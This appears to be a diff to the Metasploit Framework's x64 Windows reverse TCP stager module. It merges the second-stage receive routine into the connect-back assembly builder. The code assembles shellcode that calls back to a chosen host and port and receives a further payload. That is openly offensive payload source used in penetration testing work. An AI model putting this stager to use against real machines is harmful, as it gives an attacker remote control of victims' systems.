@@ -69,7 +69,6 @@ module Payload::Windows::ReverseTcp_x64
       start:
         pop rbp               ; block API pointer
       #{asm_reverse_tcp(opts)}
-      #{asm_block_recv(opts)}
     ^
     Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
   end
@@ -106,6 +105,7 @@ module Payload::Windows::ReverseTcp_x64
   #
   def asm_reverse_tcp(opts={})
 
+    reliable     = opts[:reliable]
     retry_count  = [opts[:retry_count].to_i, 1].max
     encoded_port = [opts[:port].to_i,2].pack("vn").unpack("N").first
     encoded_host = Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
@@ -191,15 +191,7 @@ module Payload::Windows::ReverseTcp_x64
     ^
     asm << asm_send_uuid if include_send_uuid
 
-    asm
-
-  end
-
-  def asm_block_recv(opts={})
-
-    reliable     = opts[:reliable]
-
-    asm = %Q^
+    asm << %Q^
       recv:
       ; Receive the size of the incoming second stage...
         sub rsp, 16             ; alloc some space (16 bytes) on stack for to hold the
